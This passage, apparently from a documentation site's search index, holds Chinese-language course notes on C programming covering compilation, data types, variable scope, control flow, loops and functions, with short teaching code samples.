\u7b49\u51fd\u6570\u3002</p> <p>\u5f53\u4f60\u8fd0\u884c C \u9884\u5904\u7406\u5668(\u5728\u5b9e\u9645\u7f16\u8bd1\u4e4b\u524d)\uff0c\u5b83\u4f1a\u5904\u7406\u8fd9\u4e9b\u6307\u4ee4\u5e76\u76f8\u5e94\u4fee\u6539\u4f60\u7684\u4ee3\u7801\u3002\u5728\u8fd9\u4e2a\u9884\u5904\u7406\u6b65\u9aa4\u4e4b\u540e\uff0c\u4fee\u6539\u540e\u7684\u4ee3\u7801\u5c06\u7531\u7f16\u8bd1\u5668\u8fdb\u884c\u7f16\u8bd1\u3002</p>"},{"location":"cs/c/2.1/#compiler","title":"Compiler","text":"<ol> <li>\u7f16\u8bd1\uff08Compiler\uff09\uff1a</li> </ol> <p>\u6e90\u4ee3\u7801\uff08Source Code\uff09\u6587\u4ef6\uff08\u901a\u5e38\u4e3a.c\u6587\u4ef6\uff09\u7531\u7f16\u8bd1\u5668\u5904\u7406\u3002\u7f16\u8bd1\u5668\u9996\u5148\u5bf9\u4ee3\u7801\u8fdb\u884c\u9884\u5904\u7406\uff0c\u5904\u7406\u5982 <code>#include</code> \u548c <code>#define</code> \u7b49\u6307\u4ee4\u3002\u7136\u540e\uff0c\u5b83\u4f1a\u8fdb\u884c\u5b9e\u9645\u7684\u7f16\u8bd1\u8fc7\u7a0b\uff0c\u8fd9\u5305\u62ec\u8bed\u6cd5\u5206\u6790\u3001\u8bed\u4e49\u5206\u6790\u3001\u751f\u6210\u4e2d\u95f4\u4ee3\u7801\u3001\u4f18\u5316\u4ee5\u53ca\u6700\u7ec8\u751f\u6210\u673a\u5668\u4ee3\u7801\u3002\u7f16\u8bd1\u540e\u751f\u6210\u7684\u662f\u76ee\u6807\u6587\u4ef6\uff08Object File\uff09\uff0c\u901a\u5e38\u8fd9\u662f\u4e00\u79cd\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5305\u542b\u4e86\u4ece\u6e90\u4ee3\u7801\u7f16\u8bd1\u8fc7\u6765\u7684\u673a\u5668\u6307\u4ee4\uff0c\u4f46\u8fd9\u4e9b\u6307\u4ee4\u5c1a\u672a\u94fe\u63a5\u6210\u53ef\u6267\u884c\u7a0b\u5e8f\u3002</p> <ol> <li>\u94fe\u63a5\uff08Linker\uff09\uff1a</li> </ol> <p>\u94fe\u63a5\u5668\u8d1f\u8d23\u5c06\u4e00\u4e2a\u6216\u591a\u4e2a\u76ee\u6807\u6587\u4ef6\u4e0e\u5e93\u6587\u4ef6\uff08Library Files\uff09\u7ed3\u5408\u8d77\u6765\u751f\u6210\u53ef\u6267\u884c\u6587\u4ef6\uff08Executable File\uff09\u3002\u94fe\u63a5\u8fc7\u7a0b\u89e3\u51b3\u4e86\u7a0b\u5e8f\u4e2d\u5bf9\u5e93\u51fd\u6570\u4ee5\u53ca\u7a0b\u5e8f\u4e2d\u5176\u4ed6\u6587\u4ef6\u7684\u51fd\u6570\u548c\u53d8\u91cf\u7684\u5f15\u7528\u95ee\u9898\u3002\u5982\u679c\u4f60\u7684\u7a0b\u5e8f\u8c03\u7528\u4e86\u4efb\u4f55\u5e93\u51fd\u6570\uff08\u6bd4\u5982\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u5e93\u51fd\u6570\uff09\uff0c\u94fe\u63a5\u5668\u4f1a\u67e5\u627e\u8fd9\u4e9b\u51fd\u6570\u5728\u5e93\u6587\u4ef6\u4e2d\u7684\u5b9a\u4e49\uff0c\u5e76\u5c06\u5bf9\u5e94\u7684\u4ee3\u7801\u94fe\u63a5\u5230\u4f60\u7684\u7a0b\u5e8f\u4e2d\u4ee5\u786e\u4fdd\u7a0b\u5e8f\u5b8c\u6574\u6027\u3002</p> <ol> <li>\u5e93\u6587\u4ef6\uff08Library Files\uff09\uff1a</li> </ol> <p>\u5e93\u6587\u4ef6\u5305\u542b\u9884\u5b9a\u4e49\u7684\u51fd\u6570\u548c\u8d44\u6e90\uff0c\u8fd9\u4e9b\u53ef\u4ee5\u88ab\u591a\u4e2a\u7a0b\u5e8f\u5171\u540c\u4f7f\u7528\u3002\u4e0d\u9700\u8981\u91cd\u590d\u7f16\u5199\u5e38\u7528\u7684\u4ee3\u7801\uff0c\u53ea\u9700\u5728\u9700\u8981\u65f6\u94fe\u63a5\u76f8\u5e94\u7684\u5e93\u3002</p> <p></p>"},{"location":"cs/c/2.1/#variables","title":"Variables","text":""},{"location":"cs/c/2.1/#ram","title":"RAM","text":"<ul> <li>single integer value - 4 bytes</li> <li>single floating value - 8 bytes</li> </ul>"},{"location":"cs/c/2.1/#name","title":"NAME","text":"<p>\u5b57\u6bcd\u6216\u4e0b\u5212\u7ebf\u5f00\u5934\uff0c\u540e\u63a5 _A-Za-z0-9</p> <p>C \u8bed\u8a00\u533a\u522b\u5927\u5c0f\u5199\uff0cC \u9884\u5904\u7406\u5668\u63d0\u4f9b\u7684\u5e38\u91cf\u4f7f\u7528\u5927\u5199\u8868\u793a\uff1a<code>MAXLENGTH, AVATAR, BUFSIZ, ROT</code></p> <p>\u8f83\u65e7\u7684 C \u7f16\u8bd1\u5668\u5c06\u53d8\u91cf\u540d\u79f0\u9650\u5236\u4e3a 8 \u4e2a\u552f\u4e00\u5b57\u7b26, \u5982\u679c\u4e3a\u65e7\u73af\u5883\u5f00\u53d1\u53ef\u79fb\u690d\u4ee3\u7801\uff0c\u8bf7\u8bb0\u4f4f\u8fd9\u4e00\u70b9</p>"},{"location":"cs/c/2.1/#data-type","title":"Data Type","text":"<p>bool, char, int, float \u4ee5\u53ca double \u4e3a\u4e3b\u8981\u57fa\u7840\u6570\u636e\u7c7b\u578b</p> <p>\u5386\u53f2\u4e0a\uff0c\u4e0d\u540c\u8ba1\u7b97\u673a\u5236\u9020\u5546\u5728\u57fa\u672c\u6570\u636e\u7c7b\u578b\u7684\u5185\u5b58\u5927\u5c0f\u4e0a\u5b58\u5728\u5dee\u5f02\uff0c\u5bfc\u81f4\u4e0d\u517c\u5bb9\u6027\u95ee\u9898\u3002</p> <p>C \u8bed\u8a00\u901a\u8fc7\u4e0d\u6307\u5b9a\u6570\u636e\u7c7b\u578b\u7684\u5927\u5c0f\u6765\u89e3\u51b3\u6b64\u95ee\u9898\uff0c\u4f7f\u5f97\u7a0b\u5e8f\u5728\u6e90\u4ee3\u7801\u7ea7\u522b\u5177\u6709\u53ef\u79fb\u690d\u6027\u3002</p> <p>C \u8bed\u8a00\u552f\u4e00\u8981\u6c42\u662f\u6570\u636e\u7c7b\u578b\u4e4b\u95f4\u7684\u5927\u5c0f\u5173\u7cfb\u5e94\u4e3a\uff1asizeof(char) \u2264 sizeof(short) \u2264 sizeof(int) \u2264 sizeof(long)\u3002</p> <p>\u4e0d\u540c\u4f53\u7cfb\u7ed3\u6784\u4e0a\u7684\u4e0d\u540c C \u7f16\u8bd1\u5668\u53ef\u4ee5\u4f7f\u7528\u4e0d\u540c\u5927\u5c0f\u7684\u6574\u6570\uff0c\u5bfc\u81f4\u5b58\u50a8\u5927\u5c0f\u7684\u53d8\u5316\u3002</p> <p>\u6d4b\u8bd5\u5f53\u524d\u67b6\u6784\u4e0b\u6570\u636e\u7c7b\u578b\u5185\u5b58\u5927\u5c0f\u4ee3\u7801\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main(void)\n{\n    printf(\"char  %lu\\n\", sizeof(char));\n    printf(\"short %lu\\n\", sizeof(short));\n    printf(\"int   %lu\\n\", sizeof(int));\n    printf(\"long  %lu\\n\", sizeof(long));\n    return 0;\n}\n</code></pre> <p>Macbook Air M2 \u6267\u884c\u7ed3\u679c\u5982\u4e0b\uff1a</p> <pre><code>char  1\nshort 2\nint   4\nlong  8\n</code></pre> <p>\u8fd9\u610f\u5473\u7740\u8fd9\u53f0\u67b6\u6784\u7684\u8ba1\u7b97\u673a can only represent the values -2,147,483,648 to 2,147,483,647</p> <p>\u8fd9\u4e2a\u503c\u7684\u8ba1\u7b97\u516c\u5f0f\u4e3a 4 bytes = 4 * 8 bits = 32, 2^32 = 4294967296</p> <p>\u800c\u4e3a\u4e86\u8868\u8fbe\u6b63\u8d1f\u6570\uff0c\u9700\u8981\u5206\u914d\u4e00\u534a\u7ed9\u6b63\u6570\u4e00\u534a\u7ed9\u8d1f\u6570\uff0c\u6b63\u6570\u7684\u8303\u56f4\u662f 0 \u5230 2,147,483,647\uff0c\u8d1f\u6570\u7684\u8303\u56f4\u662f -1 \u5230 -2,147,483,648\u3002</p>"},{"location":"cs/c/2.1/#the-scope-of-variables","title":"The scope of variables","text":"<p>C \u53ea\u6709 2 \u79cd\u4e3b\u8981\u7c7b\u578b\u7684\u8303\u56f4\uff1a</p> <ul> <li>global scope</li> </ul> <p>\u5168\u5c40\u4f5c\u7528\u57df\uff08\u6709\u65f6\u79f0\u4e3a\u6587\u4ef6\u4f5c\u7528\u57df\uff09\uff0c\u5176\u4e2d\u53d8\u91cf\u5728\u6240\u6709\u51fd\u6570\u548c\u8bed\u53e5\u5757\u4e4b\u5916\u58f0\u660e\uff0c\u4ee5\u53ca</p> <ul> <li>block scope in which variables are declared within a function or statement block.</li> </ul> <p>\u5728\u51fd\u6570\u6216\u8bed\u53e5\u5757\u4e2d\u58f0\u660e\u53d8\u91cf\u7684\u5757\u4f5c\u7528\u57df</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\nstatic int count = 0;\n\nint main(int argcount, char *argvalue[])\n{\n    int nfound = 0;\n\n    // check the number of arguments\n    if(argcount != 2) {\n        int nerrors = 1;\n\n        ....\n        exit(EXIT_FAILURE);\n    }\n    else {\n        int ntimes = 100;\n\n        ....\n        exit(EXIT_SUCCESS);\n    }\n    return 0;\n}\n</code></pre> <p>\u5176\u4e2d count \u4e3a global scope, static \u9632\u6b62\u5916\u90e8\u6587\u4ef6\u8bbf\u95ee\uff0cnfound\uff0cnerrors, ntimes \u5177\u6709 block scope </p> <p>C \u8bed\u8a00\u63a7\u5236\u6d41\u548c\u5176\u4ed6\u8bed\u8a00\u7c7b\u4f3c</p>"},{"location":"cs/c/2.1/#conditional-execution","title":"Conditional execution","text":"<pre><code>if(condition1) {                \n  // more statements;\n  .....\n}\nelse if(condition2) {\n  // more statements;\n  .....\n}\nelse {\n  // more statements;\n  .....\n}\n</code></pre> <p>curly-brackets \u975e\u5fc5\u9700\u4f46\u662f\u548c Java \u4e00\u6837\u4e3a\u4e00\u79cd\u4e66\u5199\u683c\u5f0f\u6807\u51c6</p>"},{"location":"cs/c/2.1/#boolean-values","title":"Boolean values","text":"<p>\u5728 ISO-C99 \u4e4b\u524d\uff0cC \u6807\u51c6\u6ca1\u6709\u5e03\u5c14\u6570\u636e\u7c7b\u578b, 0 \u4ee3\u8868 false 1 \u4ee3\u8868 true</p> <pre><code>int initialised = 0\n\nif (0 == initialised) {\n  // initialisation statements;\n  .....\n  initialised = 1; // set to true\n}\n</code></pre> <p>\u800c\u540e\u9700\u8981\u4f7f\u7528 true \u548c false constants \u7684\u65f6\u5019\u9700\u8981\u5012\u5165 <code>#include &lt;stdbool.h&gt;</code> \u5e93</p>"},{"location":"cs/c/2.1/#switch-statements","title":"switch statements","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int value = 2;\n\n    // \u4f7f\u7528 if..else if..else \u7ed3\u6784\n    if(value == 1) {\n        printf(\"The value is 1.\\n\");\n    } \n    else if(value == 2) {\n        printf(\"The value is 2.\\n\");\n    } \n    else {\n        printf(\"The value is neither 1 nor 2.\\n\");\n    }\n\n    // \u4f7f\u7528 switch \u7ed3\u6784\n    switch(value) {          \n        case 1 :\n            printf(\"The value is 1.\\n\");\n            break;\n\n        case 2 :\n            printf(\"The value is 2.\\n\");\n            break;\n\n        default :\n            printf(\"The value is neither 1 nor 2.\\n\");\n            break;\n    }\n\n    return 0;\n}\n</code></pre> <ul> <li>\u6bcf\u4e2a case \u540e\u90fd\u5fc5\u987b\u52a0\u4e0a break \u79bb\u5f00 switch control flow\uff0c\u5982\u679c\u5fd8\u8bb0\u6dfb\u52a0 break \u8bed\u53e5\u5c31\u4f1a\u81ea\u52a8\u7ee7\u7eed\u6267\u884c\u4e0b\u4e00\u4e2a case \u5206\u652f</li> <li>if \u548c switch \u4e2d\u7684 expression \u6570\u636e\u7c7b\u578b\u5fc5\u987b\u662f\u6574\u6570\u3001\u5b57\u7b26\u3001\u5e03\u5c14\u503c\u4e0e enumerated types\uff0c\u4f46\u662f\u4e0d\u80fd\u662f real \u6216 floating</li> <li>\u5982\u679c\u6bd4\u8f83\u503c\u8f83\u591a\u7684\u60c5\u51b5\u4e0b switch \u4e3a\u4f18\u5316\u4ee3\u7801\u91cf\u7b80\u6d01\u7684\u597d\u65b9\u6848\uff0c\u56e0\u4e3a case \u5185\u4e0d\u7528\u50cf if \u4e00\u6837\u6dfb\u52a0 curly brackets</li> </ul> <p>value \u8981\u5bf9\u6bd4\u7684\u53d8\u91cf\uff0cdefault \u53ef\u5f53\u4f5c if \u8bed\u53e5\u4e2d\u7684 else</p>"},{"location":"cs/c/2.1/#for-bounded-loops","title":"for - bounded loops","text":"<p>\u6709\u754c\u5faa\u73af\u548c Java \u4e00\u6837\u8bed\u6cd5\uff1a</p> <pre><code>for(int i = 1 ; i &lt;= 10 ; i = i+1) {\n// the above introduced a loop-control variable, i\n  .....\n  printf(\"loop number %i\\n\", i);\n  .....\n// variable i is available down to here\n}\n\nfor(char ch = 'a' ; ch &lt;= 'z' ; ch = ch+1) {\n  .....\n  printf(\"loop using character '%c'\\n\", ch);\n  .....\n}\n</code></pre> <p>\u4e09\u4e2a\u53c2\u6570\u4e3a\u8d77\u59cb\u503c\u3001\u505c\u6b62\u6761\u4ef6\uff0c\u6267\u884c\u8fc7\u7a0b\u7b97\u6cd5\uff1b\u53d8\u91cf\u5728 for loop \u5185\u90e8\u4f7f\u7528\u5b8c\u540e\u6d88\u5931</p>"},{"location":"cs/c/2.1/#while-do-while-unbounded-loops","title":"while &amp; do while - unbounded loops","text":"<pre><code>#include &lt;stdio.h&gt;\n\n#define NLOOPS 20\n\nint main()\n{\n    int i = 1;\n    int n = 0;\n\n    while (i &lt;= NLOOPS)\n    {\n        printf(\"iteration number %d\\n\", i);\n        // \u66ff\u6362\u6b64\u5904\u4e3a\u5b9e\u9645\u8ba1\u7b97\u65b9\u6cd5\n        i = some_calculation_setting_i;\n        n++;\n    }\n\n    printf(\"loop was traversed %d times\\n\", n);\n\n    return 0;\n}\n</code></pre> <p>\u4e0e Python \u4e00\u6837 while \u7684 expression \u610f\u601d\u4e3a\u53ea\u8981 i &lt;= 20 \u90a3\u5c31\u4fdd\u6301 true \u5982\u679c\u8d85\u8fc7\u8fd9\u4e2a\u8fb9\u754c\u90a3\u5c31 false \u9000\u51fa\u5faa\u73af</p> <pre><code>#include &lt;stdio.h&gt;\n\n#define NLOOPS 20\n\nint main()\n{\n    int i = 1;\n    int n = 0;\n\n    do\n    {\n        printf(\"iteration number %d\\n\", i);\n        // \u66ff\u6362\u6b64\u5904\u4e3a\u5b9e\u9645\u8ba1\u7b97\u65b9\u6cd5\n        i = some_calculation_setting_i;\n        n++;\n    } while (i &lt;= NLOOPS);\n\n    printf(\"loop was traversed %d times\\n\", n);\n\n    return 0;\n}\n</code></pre> <p>\u5f00\u5934 while \u6362\u6210 do \u540e curly bracket \u4e4b\u540e\u52a0\u4e0a while expression \u4e3a do while \u5faa\u73af\uff1b\u4e0e for \u4e0d\u540c\u7684\u662f while \u9700\u4ece\u5916\u90e8\u58f0\u660e\u5f15\u5165\u53d8\u91cf\u7528\u4e8e\u8fed\u4ee3</p>"},{"location":"cs/c/2.1/#nest-loop","title":"Nest loop","text":"<pre><code>#define NROWS 6\n#define NCOLS 4\n\nfor(int row = 1 ; row &lt;= NROWS ; row = row+1) {      // the 'outer' loop\n\n    for(int col = 1 ; col &lt;= NCOLS ; col = col+1) {  // the 'inner' loop\n        printf(\"(%i,%i)  \", row, col);               // print row and col as if \"coordinates\"  \n    }\n    printf(\"\\n\");                                    // finish printing on this line\n}\n</code></pre>"},{"location":"cs/c/2.1/#define-variables","title":"define &amp; variables","text":"<p>define \u4e3a\u5728\u6267\u884c\u671f\u95f4\u505a\u6587\u672c\u66ff\u6362\uff0c\u5f53\u9700\u8981\u6539\u53d8\u884c\u6570\u6216\u5217\u6570\u65f6\uff0c\u53ea\u9700\u4fee\u6539\u5b9a\u4e49\u7684\u5730\u65b9\uff0c\u800c\u4e0d\u5fc5\u5728\u6574\u4e2a\u4ee3\u7801\u4e2d\u5bfb\u627e\u548c\u4fee\u6539\u76f8\u5e94\u7684\u53d8\u91cf\u5b9a\u4e49\uff1b\u5e76\u4e14\u901a\u5e38\u9759\u6001\u53d8\u91cf\u5728\u7a0b\u5e8f\u8fd0\u884c\u671f\u95f4\u4f1a\u4e00\u76f4\u5b58\u5728\u5185\u5b58\u4e2d</p>"},{"location":"cs/c/2.1/#break-continue","title":"break &amp; continue","text":"<pre><code>for(int i = 1 ; i &lt;= 10 ; i = i+1) {\n    // Read an input character from the keyboard\n    .....\n    if(input_char == 'Q') { // Should we quit?\n        break;\n    }\n    .....\n    .....\n}\n// Come here after the 'break'.  i is unavailable\n</code></pre> <p>\u5728\u7528\u6237\u8f93\u5165 Q \u540e\u6574\u4e2a\u7a0b\u5e8f\u76f4\u63a5\u9000\u51fa</p> <pre><code>for(char ch = 'a' ; ch &lt;= 'z' ; ch = ch+1) {\n    if(ch == 'm') { // skip over the character 'm'\n        continue;\n    }\n    .....\n    .....\n    statements that will never see ch == 'm'\n    .....\n    .....\n}\n</code></pre> <p>\u5faa\u73af\u4e2d\u78b0\u5230 m \u540e\u4e0d\u505a\u4efb\u4f55\u64cd\u4f5c\u8df3\u8fc7\u8fdb\u5165\u4e0b\u4e00\u4e2a\u5faa\u73af</p>"},{"location":"cs/c/2.1/#infinite-loops","title":"infinite loops","text":"<pre><code>for( ; ; ) {\n    .....\n    .....\n}\n</code></pre> <pre><code>#include &lt;stdbool.h&gt;\n\n// clearer - use this mechanism\nwhile( true ) {\n    .....\n    .....\n}\n</code></pre>"},{"location":"cs/c/2.1/#conclusion","title":"Conclusion","text":"<ul> <li>\u76f8\u6bd4\u4e8e Python, C \u8bed\u8a00\u548c Java \u4e00\u6837\u4e0d\u5728\u4e4e indent</li> <li>C \u63d0\u4f9b\u4e24\u79cd\u6d6e\u70b9\u6570\u636e\u7c7b\u578b float \u548c double \u5206\u522b\u5360\u7528 32 \u4e0e 64 \u5b57\u8282</li> </ul> <p>\u4f46\u5728 system programming \u4e2d\u4e3a\u4e86\u907f\u514d\u7cbe\u5ea6\u9ebb\u70e6\u66f4\u591a\u53ea\u7528\u6574\u6570\u7c7b\u578b\uff1a int, short, long, long long</p>"},{"location":"cs/c/2.2/","title":"2.2 Functions","text":""},{"location":"cs/c/2.2/#wed-lecture","title":"Wed Lecture","text":"<ol> <li>\u51fd\u6570\u7684\u5b58\u5728\u662f\u4e3a\u4e86\u53ef\u8bfb\u6027\uff0c\u53ef\u79fb\u690d\u6027\uff0c\u53ef\u7ef4\u62a4\u6027\u7b49\uff0c\u4e5f\u53ef\u5728\u8f6f\u4ef6\u5de5\u7a0b\u91cd\u6784\u8fc7\u7a0b\u4e2d\u7528\u4e8e\u51cf\u5c11\u91cd\u590d\u4ee3\u7801\u91cf\u4e0e\u5185\u5b58\uff0c\u63d0\u4f9b\u5176\u4ed6\u6a21\u5757\u91cd\u590d\u8c03\u7528\uff0c\u540c\u65f6\u5c06\u8bed\u53e5\u62bd\u8c61\u5316</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u91c7\u7528\u4ee5\u4e0b\u51fd\u6570\u5b9a\u4e49\u660e\u786e\u7684\u5165\u53e3\u70b9\uff0c\u4ece\u7528\u6237\u7f16\u5199\u7684\u4ee3\u7801\u5230\u5185\u6838\u4e2d\uff0c\u6b64\u7c7b\u51fd\u6570\u79f0\u4e3a\u7cfb\u7edf\u8c03\u7528\u3002 \u5728 main \u51fd\u6570\u4e2d <code>return 0;</code> \u5c31\u662f\u5728\u544a\u8bc9\u7cfb\u7a0b\u5e8f\u6267\u884c\u5b8c\u6bd5\uff0c\u548c\u65e9\u671f\u7684\u65f6\u949f\u673a\u5236\u6709\u5173</li> <li>\u5e93\u5c01\u88c5\u518d\u5206\u53d1\uff0c\u8fd9\u91cc\u6559\u6388\u63d0\u5230 Apple \u7684\u6807\u51c6\u5e93\u4e2d\u9ed8\u8ba4\u9690\u5f0f\u5f97\u5e2e\u4f60\u8c03\u7528\u4e86\u90e8\u5206 math \u5e93\u6240\u4ee5\u4f60\u4e0d\u7528 include, \u4f46\u662f\u5728 linux \u9700\u8981\u786e\u4fdd\u6bcf\u4e2a\u7a0b\u5e8f\u90fd\u6b63\u786e\u94fe\u63a5</li> <li>\u5728\u8db3\u591f\u5148\u8fdb\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u591a\u4e2a\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u53ef\u4ee5\u5171\u4eab\u4e00\u4e2a\u51fd\u6570\u7684\u5355\u4e2a\u5b9e\u4f8b\uff0c \u6bd4\u5982 printf\uff08\uff09 - \u524d\u63d0\u662f\u51fd\u6570\u7684\u4ee3\u7801\u4e0d\u80fd\u88ab\u4efb\u4f55\u8fdb\u7a0b\u4fee\u6539\uff0c\u5e76\u4e14\u8be5\u51fd\u6570\u5f15\u7528\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u4e0d\u540c data \u548c\u4f20\u9012\u7ed9\u51fd\u6570\u7684\u53c2\u6570\u3002</li> <li>main \u51fd\u6570\u5728\u6b63\u5f0f\u7f16\u5199\u65f6\u53ea\u505a\u53c2\u6570\u5f02\u5e38\u5904\u7406</li> </ol> <p>main() should be constrained to:</p> <ul> <li>receive and check the program's command-line arguments,</li> <li>report errors detected with command-line arguments, and then call exit(EXIT_FAILURE)</li> <li>call functions from main(), typically passing information requested and provided by the command-line arguments, and finally call exit(EXIT_SUCCESS) if all went well.</li> <li>All error messages printed to the stderr stream.</li> <li>All 'normal' output printed to the stdout stream</li> </ul> Application domain (a sample of) 3rd-party libraries operating system services (files, directories, processes, inter-process communication) OS-specific libraries, e.g. glibc, System32, Cocoa web-based programming libcgi, libxml, libcurl data structures and algorithms the generic data structures library (GDSL) GUI and graphics development OpenGL, GTK, Qt, wxWidgets, UIKit, Win32, Tcl/Tk image processing (GIFs, JPGs, etc) GD, libjpeg, libpng networking Berkeley sockets, AT&amp;T's TLI security, cryptography openssl, libmp scientific computing NAG, Blas3, GNU scientific library (gsl) concurrency, parallel and GPU programming OpenMP, CUDA, OpenCL, openLinda (thread support is defined in C11, but not in C99) <p>\u867d\u7136 C \u8bed\u8a00\u672c\u8eab\u6ca1\u6709\u592a\u591a\u5b9e\u73b0\u7684\u5185\u7f6e\u65b9\u6cd5\uff0c\u4f46\u4ecd\u7136\u6709\u5927\u91cf\u7684\u5171\u4eab\u5e93</p>"},{"location":"cs/c/2.2/#the-datatype-of-a-function","title":"The datatype of a function","text":""},{"location":"cs/c/2.2/#void","title":"void","text":"<p>\u4e0d\u4f5c return \u53ea\u505a printf </p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid output(char ch, int n)        \n{\n    for(int i=1 ; i&lt;=n ; i=i+1) {\n        printf(\"%c\", ch);\n    }\n}\n\nint main(int argc, char *argv[])\n{\n    output(' ', 19);\n    output('*',  1);\n    output('\\n', 1);\n    return 0;\n}\n</code></pre>"},{"location":"cs/c/2.2/#extern","title":"extern","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nextern double sqrt(double x);\n\nfloat square(float x)\n{\n    return x * x;\n}\n\nint main(int argc, char *argv[])\n{\n    if(argc &gt; 2) {\n      float a, b, sum;\n\n      a   = atof(argv[1]);\n      b   = atof(argv[2]);\n\n      sum = square(a) + square(b);\n      printf(\"hypotenuse = %f\\n\",\n             sqrt(sum) );\n    }\n    return 0;\n}\n</code></pre> <p>header file \u91cc\u5e76\u4e0d\u4f1a\u5305\u542b\u4ee3\u7801\u5b9e\u73b0\uff0c\u53ea\u4f1a declare \u6709\u8fd9\u4e2a sqrt \u65b9\u6cd5\u5b58\u5728\u8fd9\u53eb declaration\uff0c\u4f60\u9700\u8981\u81ea\u5df1\u53bb\u7528 extern \u91cd\u65b0\u4e66\u5199\u5176 definition \u907f\u514d\u5176\u9ed8\u8ba4\u4f7f\u7528 int \u5bf9\u5f85 args. double \u7684\u539f\u56e0\u4e3a\u5728 Linux \u4e2d\u5b9e\u9645\u4e0a\u6211\u4eec\u5e76\u4e0d\u4f1a\u4f7f\u7528\u592a\u591a float, \u7cbe\u5ea6\u4e0d\u591f\u65f6\u7cfb\u7edf\u4e00\u4f1a\u81ea\u52a8\u8fdb\u884c\u4e0b\u4e00\u7ea7\u7684\u4e0a\u5347</p>"},{"location":"cs/c/2.2/#common-mistakes","title":"Common mistakes","text":"<ol> <li>\u51fd\u6570\u4e0d\u9700\u8981\u5b9a\u4e49\u53c2\u6570\u4e5f\u53ef\u4ee5\u8fd0\u884c</li> </ol> <pre><code>void backup_files( void )            \n{\n    .....\n}\n</code></pre> <ol> <li>\u5728\u7f16\u5199 C \u8bed\u8a00\u4ee3\u7801\u65f6\uff0c\u4e0d\u8981\u4f9d\u8d56\u7279\u5b9a\u7684\u53c2\u6570\u6c42\u503c\u987a\u5e8f\uff0c\u56e0\u4e3a\u7f16\u8bd1\u5668\u4f18\u5316\u4ee5\u53ca\u4e0d\u540c\u67b6\u6784\u4e0b\u7684\u4f18\u5316\u7b56\u7565\uff0c\u4e0d\u540c\u67b6\u6784\u4e0b\u8fd0\u884c\u7684\u76f8\u540c\u4ee3\u7801\u53ef\u80fd\u4f1a\u5bfc\u81f4\u53c2\u6570\u6c42\u503c\u987a\u5e8f\u4e0d\u540c</li> </ol> <pre><code>int square( int a )\n{\n    printf(\"calculating the square of %i\\n\", a);\n    return a * a;\n}\n\nvoid sum( int x, int y )\n{\n    printf(\"sum = %i\\n\", x + y );\n}\n\n....\n\n    ....\n    sum( square(3), square(4) );\n</code></pre> <p>\u4ee5\u4e0a\u8fd9\u6bb5\u4ee3\u7801\u5728\u4e0d\u540c\u7684\u673a\u5668\u4e0b\u6267\u884c\u51fa\u6765\u7684\u7ed3\u679c\u4e0d\u540c\uff1a</p> <pre><code>    calculating the square of 3     // the output on PowerPC Macs\n    calculating the square of 4\n    sum = 25\n\nor\n\n    calculating the square of 4     // the output on Intel Macs\n    calculating the square of 3\n    sum = 25\n</code></pre>"},{"location":"cs/c/2.2/#static","title":"static","text":"<p>\u5bf9\u4e8e function \u6765\u8bf4\u7c7b\u4f3c\u4e8e Java \u7684 private \u7981\u6b62\u5916\u90e8\u8bbf\u95ee\uff0c\u79c1\u6709\u5316</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n//  myfunction IS ONLY VISIBLE WITHIN THIS FILE, AND IS CALLED BY main\nstatic void myfunction(void)\n{\n    static int count = 1;    //  retains its value between function calls\n    int        local = 0;    //  is re-initialised on each function call\n\n    printf(\"count=%i  local=%i\\n\", count, local);\n    ++count;\n    ++local;\n}\n\n//  main IS NOT DECLARED AS static BECAUSE THE OPERATING SYSTEM MUST BE ABLE TO CALL IT\nint main(int argc, char *argv[])\n{\n    for(int i=0 ; i &lt; 5 ; ++i) {\n        myfunction();\n    }\n    exit(EXIT_SUCCESS);\n}\n</code></pre> <p>\u8fd9\u91cc\u7684 count \u4f5c\u4e3a\u9759\u6001\u5173\u952e\u5b57\uff0c\u6574\u4e2a\u751f\u547d\u5468\u671f\u53ea\u4f1a\u88ab\u5206\u914d\u4e00\u6b21\u5185\u5b58\uff0c\u65e0\u8bba\u51fd\u6570\u8c03\u7528\u591a\u5c11\u6b21\u8be5\u53d8\u91cf\u4e5f\u4e0d\u4f1a\u521d\u59cb\u5316\uff0c\u800c local \u4f1a\u5728\u6bcf\u6b21\u8c03\u7528\u7684\u65f6\u5019\u4f1a\u91cd\u65b0\u88ab\u521d\u59cb\u5316\u6210 0 \u4f5c\u7528\u57df\u4e3a\u51fd\u6570\u5185\u90e8</p> <pre><code>count=1  local=0\ncount=2  local=0\ncount=3  local=0\ncount=4  local=0\ncount=5  local=0\n</code></pre>"},{"location":"cs/c/2.2/#functions-receiving-a-variable-number-of-arguments","title":"Functions receiving a variable number of arguments","text":"<p>\u8fd9\u91cc\u7b80\u8981\u4ecb\u7ecd\u4e86 <code>printf</code> \u8fd9\u6837\u7684\u53c2\u6570\uff0c\u591a\u4e2a\u53ef\u53d8\u53d8\u91cf\u80fd\u591f\u7ed1\u5b9a string \u4e2d\uff0c\u5c31\u5fc5\u987b\u63d0\u4f9b <code>%d %s %i</code> \u8fd9\u79cd\u53c2\u6570</p> <p>\u6709\u65f6\u5019\u6211\u4eec\u9700\u8981\u7ed9\u7cfb\u7edf\u505a\u65e5\u5fd7\u8bb0\u5f55\u7684\u65f6\u5019\u751a\u81f3\u4e0d\u77e5\u9053\u53c2\u6570\u6570\u636e\u7c7b\u578b\u7684\u65f6\u5019\u5c31\u9700\u8981\u8c03\u7528\u7b2c\u4e09\u65b9\u5e93\u6bd4\u5982 <code>stdarg.h</code> \u53bb\u652f\u6301</p>"},{"location":"cs/c/2.2/#readings","title":"Readings","text":"<pre><code>#include &lt;stdio.h&gt;\n\n// This function takes no arguments and returns no value:\n\nvoid hello(void)\n{\n    printf(\"Hello, world!\\n\");\n}\n\nint main(void)\n{\n    hello();  // Prints \"Hello, 